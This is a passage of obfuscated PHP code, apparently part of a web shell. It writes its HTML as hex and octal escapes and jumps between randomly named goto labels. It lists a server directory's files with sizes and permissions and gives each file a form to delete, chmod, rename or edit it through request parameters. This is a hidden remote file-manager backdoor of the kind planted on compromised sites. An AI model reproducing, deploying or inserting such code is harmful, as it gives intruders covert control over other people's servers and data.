x3c\x69\156\x70\x75\x74\40\x74\x79\x70\145\75\x22\x68\x69\144\144\145\x6e\x22\x20\156\141\155\145\x3d\x22\160\141\164\150\42\x20\166\141\154\x75\145\75\42{$path}\x2f{$dir}\42\76\12\x3c\x69\156\x70\x75\164\40\164\171\x70\x65\75\42\163\x75\142\155\x69\x74\x22\x20\x76\141\154\x75\145\75\42\x3e\42\x20\x2f\76\xa\74\x2f\x66\157\162\x6d\76\x3c\x2f\143\x65\x6e\x74\145\162\x3e\74\57\164\x64\76\xa\x3c\x2f\164\x72\76"; } echo "\74\x74\162\40\x63\x6c\141\163\163\x3d\x22\x66\151\162\x73\164\x22\x3e\x3c\164\144\x3e\74\57\164\x64\76\74\x74\144\x3e\74\x2f\164\144\76\74\x74\144\76\x3c\x2f\164\x64\76\x3c\x74\x64\76\74\x2f\164\144\76\x3c\x2f\164\x72\76"; foreach ($scandir as $file) { if (!is_file("{$path}\x2f{$file}")) { continue; } $size = filesize("{$path}\x2f{$file}") / 1024; $size = round($size, 3); if ($size >= 1024) { $size = round($size / 1024, 2) . "\40\115\x42"; } else { $size = $size . "\x20\113\102"; } echo "\x3c\x74\x72\76\xa\74\x74\x64\76\x3c\141\x20\150\x72\145\x66\75\42\x3f\x66\x69\x6c\145\x73\162\143\x3d{$path}\x2f{$file}\x26\x70\141\164\150\x3d{$path}\x22\76{$file}\x3c\57\141\76\74\x2f\x74\144\x3e\xa\74\164\144\x3e\74\143\145\156\x74\x65\162\76" . $size . "\74\57\x63\x65\x6e\x74\x65\162\x3e\x3c\x2f\x74\144\x3e\12\x3c\164\144\x3e\x3c\143\145\x6e\x74\145\162\76"; if (is_writable("{$path}\x2f{$file}")) { echo "\x3c\x66\x6f\x6e\164\40\x63\x6f\x6c\157\x72\x3d\42\143\x79\141\156\x22\x3e"; } elseif (!is_readable("{$path}\x2f{$file}")) { echo "\x3c\x66\x6f\x6e\x74\x20\143\x6f\154\157\x72\75\x22\162\145\144\x22\x3e"; } echo perms("{$path}\x2f{$file}"); if (is_writable("{$path}\57{$file}") || !is_readable("{$path}\x2f{$file}")) { echo "\74\57\146\x6f\x6e\x74\x3e"; } echo "\x3c\57\143\x65\156\x74\x65\x72\x3e\74\x2f\164\x64\76\xa\x3c\x74\144\x3e\74\x63\145\x6e\x74\x65\x72\x3e\74\146\x6f\x72\155\x20\x6d\x65\164\x68\157\x64\75\42\x50\x4f\x53\124\x22\x20\141\x63\x74\x69\157\x6e\x3d\42\77\157\160\x74\151\157\156\46\x70\x61\164\150\75{$path}\42\76\xa\74\163\145\x6c\145\x63\164\40\156\x61\x6d\145\75\x22\x6f\160\164\42\76\xa\x3c\x6f\x70\x74\151\x6f\x6e\x20\166\141\154\x75\x65\75\42\x22\76\x3c\x2f\157\x70\164\151\x6f\156\76\xa\x3c\157\160\164\x69\157\156\x20\166\141\x6c\165\x65\x3d\x22\144\145\154\145\x74\x65\42\x3e\104\x65\154\145\164\x65\74\57\x6f\160\x74\x69\157\x6e\x3e\12\x3c\x6f\160\164\x69\157\156\x20\166\x61\154\165\x65\75\x22\143\x68\155\x6f\x64\x22\x3e\103\x68\x6d\x6f\144\74\57\x6f\160\x74\x69\x6f\156\x3e\xa\x3c\157\x70\x74\x69\x6f\156\40\x76\141\x6c\165\x65\x3d\x22\162\145\x6e\141\155\x65\42\x3e\x52\x65\x6e\x61\x6d\x65\x3c\x2f\x6f\160\x74\x69\x6f\x6e\x3e\xa\74\157\x70\164\151\157\x6e\x20\x76\141\x6c\x75\x65\75\x22\x65\x64\x69\164\x22\76\x45\144\151\x74\x3c\57\x6f\160\x74\x69\x6f\156\76\xa\x3c\57\x73\x65\154\145\x63\164\76\12\x3c\x69\x6e\x70\x75\x74\x20\x74\171\160\145\75\x22\x68\151\x64\x64\145\156\42\x20\156\x61\x6d\x65\75\42\x74\x79\160\145\x22\x20\x76\141\154\165\x65\75\x22\146\x69\x6c\145\42\x3e\12\74\151\x6e\x70\x75\164\x20\164\x79\x70\x65\75\42\150\x69\144\x64\145\x6e\42\x20\x6e\141\155\x65\x3d\42\156\x61\155\145\x22\40\166\x61\x6c\x75\x65\x3d\42{$file}\x22\76\xa\74\x69\156\160\165\x74\x20\x74\171\160\145\75\42\150\151\x64\144\x65\x6e\42\x20\156\141\x6d\145\x3d\42\x70\141\164\150\42\40\166\x61\x6c\x75\145\x3d\x22{$path}\57{$file}\42\76\12\x3c\x69\156\160\x75\x74\40\164\x79\x70\145\75\x22\163\165\142\155\x69\x74\42\x20\166\x61\154\x75\x65\75\42\x3e\x22\40\57\76\12\x3c\57\x66\157\x72\x6d\76\x3c\57\143\145\156\164\x65\162\76\x3c\57\164\x64\x3e\xa\74\57\164\162\76"; } echo "\74\x2f\164\x61\x62\x6c\145\76\12\74\57\144\151\x76\x3e"; } goto ibDzI; LPVlC: $paths = explode("\x2f", $path); goto Gao5w; cGLgZ: ?>